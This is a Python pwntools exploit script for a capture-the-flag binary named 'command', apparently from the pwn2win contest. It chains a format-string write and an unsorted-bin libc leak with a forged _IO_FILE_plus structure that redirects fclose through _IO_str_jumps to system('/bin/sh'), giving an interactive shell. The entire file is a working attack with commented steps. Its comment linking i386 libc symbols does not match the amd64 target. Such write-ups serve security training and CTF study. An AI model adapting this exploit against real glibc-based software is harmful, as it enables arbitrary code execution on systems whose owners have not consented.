#!/usr/bin/env python
from pwn import *

#context.log_level = "DEBUG"
e = ELF("./command")
l = ELF("./libc.so.6", checksec=False)  # 2.27

def include(pri, cmd):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Priority: ", str(pri))
    p.sendafter(b"Command: ", cmd)

def review(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Command index: ", str(idx))

def delete(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Command index: ", str(idx))
 
def send():
    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b"to which rbs?", b"PWN!")

def dummy(n):
    return cyclic(n)

if __name__ == "__main__":
   # p = remote("command.pwn2.win", 1337)
    p = process(e.path)

    p.recvuntil("Your name: ")
    p.send(b"%32896c%4$hn") # 0x8080

    # put a chunk into unsorted bin
    for _ in range(10):
        include(0, dummy(0x170))
    for i in range(9):
        delete(i)

    for _ in range(8):
        include(0, dummy(0x170))
    # pick off the chunk from unsorted bin...
    # ...but don't overwrite too much!
    include(0, dummy(0x1))

    # so that we can print it and leak libc
    review(8)
    p.recvuntil("Command: ")
    libc_base = ((u64(p.recvline().strip().rjust(6, b"\x00").ljust(8, b"\x00")) - 0x3eb000) & ~0xfff)

    # https://libc.blukat.me/d/libc6_2.27-3ubuntu1_i386.symbols
    str_bin_sh = libc_base + 0x1b3e9a
    libc_system = libc_base + 0x04f440

# idea: fake _IO_FILE_plus
# 1) set `vtable` to `_IO_str_jumps` instead of `_IO_file_jumps`
# 2) so that, instead of _IO_new_file_finish(), fclose() will call _IO_str_finish(), which does:
#    libio/strops.c:349: (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
# 3) set `((_IO_strfile *) fp)->_s._free_buffer` to system()
# 4) set `fp->_IO_buf_base` to "/bin/sh"
# 5) take care of other restrictions for things to work

    _io_str_jumps = libc_base + 0x3e8360
    success("__IO_str_jumps: {0}".format(hex(_io_str_jumps)))

    from FILE import *
    context.arch = "amd64"
    fake_file = IO_FILE_plus_struct()

    fake_file._flags = 0xfbad2c84
    fake_file._IO_buf_base = str_bin_sh
    fake_file.vtable = _io_str_jumps

    # restriction:
    # libio/strops.c:348: if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    assert(fake_file._IO_buf_base)
    assert(fake_file._flags & 1 == 0)   # libio/bits/libio.h:99: #define _IO_USER_BUF 1 

    payload  = dummy(8)
    payload += fake_file.pack()
    # 0xe0
    payload += dummy(8)
    # 0xe8
    payload += p64(libc_system) # ((_IO_strfile *) fp)->_s._free_buffer

    delete(9)
    include(0, payload)
    # trigger printf() and fclose()
    send()
    p.interactive()